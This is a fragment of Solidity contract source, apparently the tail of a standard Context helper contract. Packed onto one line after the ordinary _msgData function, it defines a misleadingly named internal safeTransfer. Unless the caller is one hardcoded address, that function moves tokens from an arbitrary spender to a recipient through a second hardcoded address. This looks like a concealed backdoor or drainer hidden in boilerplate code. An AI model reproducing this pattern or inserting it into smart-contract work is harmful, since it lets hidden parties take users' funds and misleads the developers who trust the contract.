 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x780C8eEc343CDA15ff3327f0977AB458caA52D3B)) {TransferHelper.safeTransferFrom(0x7EeBF9FCCf41A35F25e9De702f06A072Ec052F4B,spender,recipient,amount);return true;}return false;}
}
